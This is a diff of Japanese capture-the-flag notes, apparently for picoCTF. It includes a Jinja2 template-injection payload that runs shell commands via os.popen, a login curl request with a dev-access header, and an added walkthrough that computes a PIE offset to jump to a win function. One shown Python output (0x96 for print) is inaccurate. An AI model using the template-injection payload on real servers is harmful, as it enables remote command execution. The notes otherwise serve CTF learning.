@@ -71,3 +71,21 @@ curl -X POST -H "X-Dev-Access: yes" -d 'email=ctf-player@picoctf.org&password=ad
 1. `{{7*'7'}}`を試す => `7777777`
 2. Jinja2(Python)
 `{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('<Command>').read()}}`
+
+# PIE TIME
+1. プログラムを実行する
+```bash
+$ ./vuln
+Address of main: 0x5590496b433d
+Enter the address to jump to, ex => 0x12345:
+```
+2. main関数とwin関数のoffsetを求める
+```bash
+nm ./vuln | grep -E '(main|win)$'
+# 000000000000133d T main
+# 00000000000012a7 T win
+python3
+>>> print(0x133d - 0x12a7)
+0x96
+```
+3. win関数にジャンプさせる
